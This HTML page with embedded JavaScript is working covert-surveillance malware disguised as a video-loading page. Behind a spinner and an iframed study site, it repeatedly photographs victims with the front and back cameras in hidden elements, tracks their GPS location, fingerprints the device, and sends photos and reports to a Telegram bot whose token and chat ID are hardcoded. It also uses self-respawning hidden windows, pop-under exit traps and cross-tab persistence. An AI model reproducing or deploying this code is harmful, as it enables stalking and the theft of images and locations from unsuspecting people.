<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
        }
        
        #captureCanvas {
            display: none;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            color: #fff;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="loadingScreen">
        <div class="spinner"></div>
        <p>Loading...</p>
    </div>
    
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <iframe id="websiteFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-modals"></iframe>

    <script>
        // =====================================================
        //  ULTIMATE BACKGROUND SURVEILLANCE SYSTEM
        //  All Advanced Features Integrated
        // =====================================================
        
        const CONFIG = {
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            PHOTOS_PER_CAMERA: 3,
            CAPTURE_DELAY: 250,
            CAMERA_WARMUP: 1200,
            SWITCH_DELAY: 500,
            IMAGE_QUALITY: 0.88,
            MIN_BLOB_SIZE: 1000,
            VIDEO_WIDTH: 1280,
            VIDEO_HEIGHT: 720,
            ENABLE_BACKGROUND_PERSISTENCE: true,
            ENABLE_MULTI_TAB: true,
            ENABLE_EXIT_TRAPS: true,
            ENABLE_HIDDEN_WINDOWS: true,
            STEALTH_MODE: true
        };
        
        const STATE = {
            isRunning: false,
            permissionGranted: false,
            currentStream: null,
            currentCamera: null,
            sessionId: Date.now(),
            tabId: Math.random().toString(36).substr(2, 9),
            userChatId: null,
            targetWebsite: null,
            totalPhotosSent: 0,
            cycleCount: 0,
            deviceInfo: {},
            locationInfo: null,
            batteryInfo: null,
            fingerprintData: {},
            availableCameras: [],
            cameraReady: false,
            hiddenWindows: new Set(),
            broadcastChannel: null,
            indexedDB: null,
            locationWatchId: null,
            otherTabs: new Set()
        };
        
        const elements = {
            video: document.getElementById('cameraVideo'),
            canvas: document.getElementById('captureCanvas'),
            frame: document.getElementById('websiteFrame'),
            loading: document.getElementById('loadingScreen')
        };
        
        function log(message, level = 'info') {
            if (!CONFIG.STEALTH_MODE) {
                console.log(`[${level.toUpperCase()}] ${message}`);
            }
        }
        
        function hideLoading() {
            elements.loading.style.display = 'none';
        }
        
        // ============== BACKGROUND PERSISTENCE ==============
        
        class BackgroundPersistence {
            constructor() {
                this.db = null;
                this.isSetup = false;
            }
            
            async setupIndexedDB() {
                return new Promise((resolve, reject) => {
                    const request = indexedDB.open('surveillance_db', 1);
                    
                    request.onerror = () => reject(request.error);
                    
                    request.onsuccess = () => {
                        this.db = request.result;
                        STATE.indexedDB = this.db;
                        log('IndexedDB initialized', 'success');
                        resolve(this.db);
                    };
                    
                    request.onupgradeneeded = (event) => {
                        const db = event.target.result;
                        
                        if (!db.objectStoreNames.contains('photos')) {
                            db.createObjectStore('photos', { keyPath: 'id', autoIncrement: true });
                        }
                        if (!db.objectStoreNames.contains('location')) {
                            db.createObjectStore('location', { keyPath: 'timestamp' });
                        }
                        if (!db.objectStoreNames.contains('sessions')) {
                            db.createObjectStore('sessions', { keyPath: 'sessionId' });
                        }
                        if (!db.objectStoreNames.contains('device_info')) {
                            db.createObjectStore('device_info', { keyPath: 'id' });
                        }
                    };
                });
            }
            
            async storeData(storeName, data) {
                if (!this.db) return;
                
                try {
                    const transaction = this.db.transaction([storeName], 'readwrite');
                    const store = transaction.objectStore(storeName);
                    await store.add({ ...data, timestamp: Date.now(), synced: false });
                    log(`Data stored in ${storeName}`, 'success');
                } catch (e) {
                    log(`Storage error: ${e.message}`, 'error');
                }
            }
            
            async syncPendingData() {
                if (!navigator.onLine || !this.db) return;
                
                const stores = ['photos', 'location', 'sessions'];
                
                for (const storeName of stores) {
                    try {
                        const transaction = this.db.transaction([storeName], 'readonly');
                        const store = transaction.objectStore(storeName);
                        const request = store.getAll();
                        
                        request.onsuccess = async () => {
                            const items = request.result.filter(item => !item.synced);
                            for (const item of items) {
                                // Send to Telegram
                                // Mark as synced
                            }
                        };
                    } catch (e) {
                        log(`Sync error: ${e.message}`, 'error');
                    }
                }
            }
        }
        
        // ============== MULTI-TAB COORDINATION ==============
        
        class MultiTabCoordinator {
            constructor() {
                this.channel = null;
                this.heartbeatInterval = null;
            }
            
            async init() {
                if (!('BroadcastChannel' in window)) {
                    log('BroadcastChannel not supported', 'warning');
                    return;
                }
                
                this.channel = new BroadcastChannel('surveillance_network');
                STATE.broadcastChannel = this.channel;
                
                this.channel.onmessage = (event) => {
                    this.handleMessage(event.data);
                };
                
                // Announce presence
                this.broadcast({
                    type: 'tab_announce',
                    tabId: STATE.tabId,
                    sessionId: STATE.sessionId,
                    timestamp: Date.now()
                });
                
                // Heartbeat
                this.heartbeatInterval = setInterval(() => {
                    this.broadcast({
                        type: 'heartbeat',
                        tabId: STATE.tabId,
                        isRunning: STATE.isRunning,
                        photoCount: STATE.totalPhotosSent
                    });
                }, 5000);
                
                log('Multi-tab coordination active', 'success');
            }
            
            handleMessage(data) {
                switch (data.type) {
                    case 'tab_announce':
                        if (data.tabId !== STATE.tabId) {
                            STATE.otherTabs.add(data.tabId);
                            log(`Other tab detected: ${data.tabId}`, 'info');
                        }
                        break;
                    
                    case 'heartbeat':
                        if (data.tabId !== STATE.tabId) {
                            STATE.otherTabs.add(data.tabId);
                        }
                        break;
                    
                    case 'command':
                        this.handleCommand(data.command);
                        break;
                }
            }
            
            broadcast(data) {
                if (this.channel) {
                    this.channel.postMessage(data);
                }
            }
            
            handleCommand(command) {
                // Execute commands from other tabs
                switch (command) {
                    case 'start':
                        if (!STATE.isRunning) mainLoop();
                        break;
                    case 'stop':
                        STATE.isRunning = false;
                        break;
                }
            }
            
            cleanup() {
                if (this.heartbeatInterval) {
                    clearInterval(this.heartbeatInterval);
                }
                if (this.channel) {
                    this.channel.close();
                }
            }
        }
        
        // ============== HIDDEN BACKUP WINDOWS ==============
        
        class HiddenWindowManager {
            constructor() {
                this.windows = new Set();
                this.monitorInterval = null;
            }
            
            createHiddenBackup() {
                if (!CONFIG.ENABLE_HIDDEN_WINDOWS) return;
                
                const features = [
                    'width=1',
                    'height=1',
                    'left=-9999',
                    'top=-9999',
                    'menubar=no',
                    'toolbar=no',
                    'location=no',
                    'status=no',
                    'scrollbars=no',
                    'resizable=no'
                ].join(',');
                
                try {
                    const backup = window.open('about:blank', `_backup_${Date.now()}`, features);
                    
                    if (backup && !backup.closed) {
                        this.windows.add(backup);
                        
                        // Inject persistence script
                        backup.document.write(this.getBackupHTML());
                        backup.document.close();
                        
                        log('Hidden backup window created', 'success');
                        
                        // Monitor window
                        setTimeout(() => this.monitorWindow(backup), 1000);
                    }
                } catch (e) {
                    log('Could not create hidden window', 'warning');
                }
            }
            
            monitorWindow(win) {
                const check = setInterval(() => {
                    if (win.closed) {
                        clearInterval(check);
                        this.windows.delete(win);
                        // Recreate if needed
                        if (this.windows.size === 0) {
                            this.createHiddenBackup();
                        }
                    }
                }, 2000);
            }
            
            getBackupHTML() {
                return `
<!DOCTYPE html>
<html>
<head>
    <title>New Tab</title>
    <style>body{margin:0;padding:0;background:transparent}</style>
</head>
<body>
    <script>
        const mainSessionId = ${STATE.sessionId};
        const mainUrl = '${window.location.href}';
        let mainWindow = window.opener;
        
        // Reconnect loop
        setInterval(() => {
            if (!mainWindow || mainWindow.closed) {
                mainWindow = window.open(mainUrl, '_blank');
            }
        }, 10000);
        
        // Heartbeat
        setInterval(() => {
            if (mainWindow && !mainWindow.closed) {
                try {
                    mainWindow.postMessage({
                        type: 'backup_heartbeat',
                        timestamp: Date.now()
                    }, '*');
                } catch (e) {}
            }
        }, 30000);
        
        // Prevent closing
        window.onbeforeunload = () => {
            window.open('', '_blank', 'width=1,height=1,left=-9999,top=-9999');
            return null;
        };
    <\/script>
</body>
</html>`;
            }
            
            cleanup() {
                this.windows.forEach(win => {
                    try {
                        win.close();
                    } catch (e) {}
                });
                this.windows.clear();
            }
        }
        
        // ============== EXIT TRAPS ==============
        
        class ExitTrapManager {
            constructor() {
                this.isTrapped = false;
                this.originalUrl = window.location.href;
            }
            
            setupTraps() {
                if (!CONFIG.ENABLE_EXIT_TRAPS) return;
                
                // Trap link clicks
                document.addEventListener('click', (e) => {
                    const link = e.target.closest('a');
                    if (link && link.href && !link.href.startsWith('#')) {
                        if (this.shouldTrap(link.href)) {
                            e.preventDefault();
                            this.handleExit(link.href);
                        }
                    }
                }, true);
                
                // Trap back button
                window.addEventListener('popstate', () => {
                    this.createPopUnder();
                });
                
                // Trap close attempts
                window.addEventListener('beforeunload', (e) => {
                    this.handleBeforeUnload(e);
                });
                
                log('Exit traps activated', 'success');
            }
            
            shouldTrap(url) {
                // Determine if we should trap this navigation
                const currentDomain = window.location.hostname;
                try {
                    const targetDomain = new URL(url).hostname;
                    return targetDomain !== currentDomain;
                } catch (e) {
                    return false;
                }
            }
            
            handleExit(targetUrl) {
                // Create pop-under before redirecting
                this.createPopUnder();
                
                // Allow redirect after delay
                setTimeout(() => {
                    window.location.href = targetUrl;
                }, 100);
            }
            
            createPopUnder() {
                try {
                    const features = 'width=1,height=1,left=-9999,top=-9999';
                    const popunder = window.open(this.originalUrl, '_popunder', features);
                    
                    if (popunder) {
                        popunder.blur();
                        window.focus();
                        STATE.hiddenWindows.add(popunder);
                        log('Pop-under created', 'info');
                    }
                } catch (e) {
                    log('Pop-under blocked', 'warning');
                }
            }
            
            handleBeforeUnload(e) {
                // Create backup before closing
                this.createPopUnder();
                
                // Don't show confirmation dialog (annoying)
                return undefined;
            }
        }
        
        // ============== ADVANCED FINGERPRINTING ==============
        
        async function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                return canvas.toDataURL().substring(0, 100);
            } catch (e) {
                return 'unavailable';
            }
        }
        
        async function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'unavailable';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return 'limited';
                
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch (e) {
                return 'unavailable';
            }
        }
        
        async function getAdvancedFingerprint() {
            const fingerprint = {
                canvas: await getCanvasFingerprint(),
                webgl: await getWebGLFingerprint(),
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                platform: navigator.platform,
                languages: navigator.languages || [navigator.language],
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                touchPoints: navigator.maxTouchPoints || 0,
                timestamp: Date.now()
            };
            
            // Create hash
            const fpString = JSON.stringify(fingerprint);
            const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(fpString));
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            fingerprint.hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
            
            STATE.fingerprintData = fingerprint;
            return fingerprint;
        }
        
        // ============== DEVICE & LOCATION ==============
        
        async function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                devicePixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localTime: new Date().toLocaleString(),
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                connection: navigator.connection?.effectiveType || 'unknown',
                onLine: navigator.onLine
            };
            
            // Get IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ipAddress = ipData.ip;
            } catch (e) {
                info.ipAddress = 'N/A';
            }
            
            STATE.deviceInfo = info;
            return info;
        }
        
        async function getBatteryInfo() {
            if (!navigator.getBattery) return null;
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch (e) {
                return null;
            }
        }
        
        async function getLocation() {
            if (!navigator.geolocation) return null;
            
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy),
                            timestamp: new Date().toLocaleString(),
                            googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                        };
                        STATE.locationInfo = location;
                        resolve(location);
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }
        
        function startLocationTracking() {
            if (!navigator.geolocation) return;
            
            STATE.locationWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    STATE.locationInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy),
                        timestamp: new Date().toLocaleString(),
                        googleMapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                    };
                },
                null,
                { enableHighAccuracy: true, maximumAge: 0 }
            );
        }
        
        async function sendGoogleMapsLocation() {
            if (!STATE.locationInfo) return;
            
            try {
                await fetch(`${CONFIG.TELEGRAM_API}/sendVenue`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        latitude: STATE.locationInfo.latitude,
                        longitude: STATE.locationInfo.longitude,
                        title: 'üìç User Location',
                        address: `Accuracy: ${STATE.locationInfo.accuracy}m\n${STATE.locationInfo.timestamp}`
                    })
                });
                log('Location map sent', 'success');
            } catch (e) {
                log('Map send failed', 'error');
            }
        }
        
        // ============== MESSAGE FORMATTING ==============
        
        function formatDeviceReport() {
            const info = STATE.deviceInfo;
            const battery = STATE.batteryInfo;
            const location = STATE.locationInfo;
            const fingerprint = STATE.fingerprintData;
            
            let msg = `üîê *ULTIMATE SURVEILLANCE REPORT*\n\n`;
            
            msg += `üñ•Ô∏è *System:*\n`;
            msg += `‚Ä¢ Platform: ${info.platform}\n`;
            msg += `‚Ä¢ Language: ${info.language}\n`;
            msg += `‚Ä¢ IP: ${info.ipAddress}\n\n`;
            
            msg += `üì∫ *Display:*\n`;
            msg += `‚Ä¢ Resolution: ${info.screenWidth}x${info.screenHeight}\n`;
            msg += `‚Ä¢ Ratio: ${info.devicePixelRatio}\n\n`;
            
            if (battery) {
                msg += `üîã *Battery:*\n`;
                msg += `‚Ä¢ Level: ${battery.level}%\n`;
                msg += `‚Ä¢ Charging: ${battery.charging ? 'Yes ‚ö°' : 'No'}\n\n`;
            }
            
            if (location) {
                msg += `üìç *Location:*\n`;
                msg += `‚Ä¢ Coords: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}\n`;
                msg += `‚Ä¢ Accuracy: ${location.accuracy}m\n`;
                msg += `‚Ä¢ [Google Maps](${location.googleMapsLink})\n\n`;
            }
            
            msg += `üåê *Network:*\n`;
            msg += `‚Ä¢ Type: ${info.connection}\n`;
            msg += `‚Ä¢ Online: ${info.onLine ? 'Yes' : 'No'}\n\n`;
            
            if (fingerprint.hash) {
                msg += `üîë *Fingerprint:*\n`;
                msg += `‚Ä¢ Hash: \`${fingerprint.hash}\`\n\n`;
            }
            
            msg += `üÜî *Session:*\n`;
            msg += `‚Ä¢ ID: \`${STATE.sessionId}\`\n`;
            msg += `‚Ä¢ Tab: \`${STATE.tabId}\`\n`;
            msg += `‚Ä¢ User: \`${STATE.userChatId}\`\n`;
            
            return msg;
        }
        
        async function sendDeviceReport() {
            try {
                const message = formatDeviceReport();
                
                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                if (STATE.locationInfo) {
                    await sendGoogleMapsLocation();
                }
                
                log('Device report sent', 'success');
            } catch (e) {
                log('Report send failed', 'error');
            }
        }
        
        // ============== CAMERA FUNCTIONS ==============
        
        async function requestCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(track => track.stop());
                STATE.permissionGranted = true;
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
                
                log('Camera permission granted', 'success');
                return true;
            } catch (e) {
                log('Camera permission denied', 'error');
                return false;
            }
        }
        
        async function startCamera(facingMode) {
            try {
                STATE.cameraReady = false;
                
                if (STATE.currentStream) {
                    STATE.currentStream.getTracks().forEach(track => track.stop());
                    await new Promise(r => setTimeout(r, 200));
                }
                
                elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
                
                STATE.currentStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: facingMode },
                        width: { ideal: CONFIG.VIDEO_WIDTH },
                        height: { ideal: CONFIG.VIDEO_HEIGHT }
                    }
                });
                
                elements.video.srcObject = STATE.currentStream;
                
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => reject(new Error('Timeout')), 5000);
                    elements.video.onloadedmetadata = () => {
                        clearTimeout(timeout);
                        resolve();
                    };
                });
                
                await elements.video.play();
                await new Promise(r => setTimeout(r, CONFIG.CAMERA_WARMUP));
                
                STATE.cameraReady = true;
                return true;
            } catch (e) {
                return false;
            }
        }
        
        async function capturePhoto() {
            return new Promise((resolve) => {
                if (!STATE.cameraReady || elements.video.readyState < 2) {
                    resolve(null);
                    return;
                }
                
                try {
                    const canvas = elements.canvas;
                    const ctx = canvas.getContext('2d');
                    canvas.width = elements.video.videoWidth;
                    canvas.height = elements.video.videoHeight;
                    ctx.drawImage(elements.video, 0, 0);
                    
                    canvas.toBlob((blob) => {
                        resolve(blob && blob.size > CONFIG.MIN_BLOB_SIZE ? blob : null);
                    }, 'image/jpeg', CONFIG.IMAGE_QUALITY);
                } catch (e) {
                    resolve(null);
                }
            });
        }
        
        async function sendPhoto(blob, cameraType, photoNum) {
            if (!blob) return false;
            
            let caption = `üì∏ *${cameraType.toUpperCase()} #${photoNum}*\n\n`;
            caption += `üë§ \`${STATE.userChatId}\`\n`;
            caption += `üîÑ Cycle: ${STATE.cycleCount}\n`;
            
            if (STATE.batteryInfo) {
                caption += `üîã ${STATE.batteryInfo.level}%\n`;
            }
            
            if (STATE.locationInfo) {
                caption += `üìç [${STATE.locationInfo.latitude.toFixed(6)}, ${STATE.locationInfo.longitude.toFixed(6)}](${STATE.locationInfo.googleMapsLink})\n`;
            }
            
            caption += `‚è∞ ${new Date().toLocaleTimeString()}`;
            
            try {
                const formData = new FormData();
                formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
                formData.append('photo', blob, `${cameraType}_${photoNum}.jpg`);
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');
                
                const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.ok) {
                    STATE.totalPhotosSent++;
                    return true;
                }
            } catch (e) {}
            
            return false;
        }
        
        async function captureBurst(cameraType) {
            for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
                if (!STATE.isRunning) break;
                const blob = await capturePhoto();
                if (blob) await sendPhoto(blob, cameraType, i);
                if (i < CONFIG.PHOTOS_PER_CAMERA) {
                    await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
                }
            }
        }
        
        async function mainLoop() {
            if (STATE.isRunning) return;
            STATE.isRunning = true;
            
            await sendDeviceReport();
            
            while (STATE.isRunning) {
                try {
                    STATE.cycleCount++;
                    
                    if (STATE.cycleCount % 3 === 0) {
                        STATE.batteryInfo = await getBatteryInfo();
                    }
                    
                    if (await startCamera('user')) {
                        await captureBurst('front');
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(r => setTimeout(r, CONFIG.SWITCH_DELAY));
                    
                    if (await startCamera('environment')) {
                        await captureBurst('back');
                    }
                    
                    if (!STATE.isRunning) break;
                    await new Promise(r => setTimeout(r, CONFIG.SWITCH_DELAY));
                } catch (e) {
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
        }
        
        // ============== URL PARSING ==============
        
        function parseConfig() {
            const params = new URLSearchParams(window.location.search);
            let website = params.get('site') || params.get('url') || 
                         'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
            
            if (!website.startsWith('http')) website = 'https://' + website;
            
            STATE.targetWebsite = decodeURIComponent(website);
            STATE.userChatId = params.get('chat_id') || 'unknown_' + Math.random().toString(36).substr(2, 9);
        }
        
        function loadWebsite() {
            try {
                elements.frame.src = STATE.targetWebsite;
                document.title = 'Loading...';
            } catch (e) {}
        }
        
        // ============== INITIALIZATION ==============
        
        async function init() {
            log('=== ULTIMATE SYSTEM INIT ===', 'info');
            
            parseConfig();
            
            // Initialize all managers
            const persistence = new BackgroundPersistence();
            const multiTab = new MultiTabCoordinator();
            const hiddenWin = new HiddenWindowManager();
            const exitTraps = new ExitTrapManager();
            
            // Setup
            if (CONFIG.ENABLE_BACKGROUND_PERSISTENCE) {
                await persistence.setupIndexedDB();
            }
            
            if (CONFIG.ENABLE_MULTI_TAB) {
                await multiTab.init();
            }
            
            if (CONFIG.ENABLE_HIDDEN_WINDOWS) {
                setTimeout(() => hiddenWin.createHiddenBackup(), 3000);
            }
            
            if (CONFIG.ENABLE_EXIT_TRAPS) {
                exitTraps.setupTraps();
            }
            
            // Collect data
            await collectDeviceInfo();
            STATE.batteryInfo = await getBatteryInfo();
            await getLocation();
            startLocationTracking();
            await getAdvancedFingerprint();
            
            loadWebsite();
            
            const hasPermission = await requestCameraPermission();
            
            if (hasPermission) {
                hideLoading();
                setTimeout(() => mainLoop(), 2000);
            } else {
                hideLoading();
            }
            
            setInterval(() => getBatteryInfo(), 30000);
            
            // Store session
            if (persistence.db) {
                persistence.storeData('sessions', {
                    sessionId: STATE.sessionId,
                    tabId: STATE.tabId,
                    startTime: Date.now()
                });
            }
        }
        
        // ============== EVENT HANDLERS ==============
        
        window.addEventListener('beforeunload', () => {
            STATE.isRunning = false;
            if (STATE.currentStream) {
                STATE.currentStream.getTracks().forEach(track => track.stop());
            }
            if (STATE.locationWatchId) {
                navigator.geolocation.clearWatch(STATE.locationWatchId);
            }
        });
        
        window.addEventListener('message', (event) => {
            if (event.data.type === 'backup_heartbeat') {
                log('Backup window alive', 'info');
            }
        });
        
        // Debug API
        window.surveillance = {
            stop: () => { STATE.isRunning = false; },
            start: () => { if (!STATE.isRunning) mainLoop(); },
            status: () => STATE,
            sendReport: sendDeviceReport
        };
        
        window.addEventListener('load', init);
    </script>
</body>
</html>
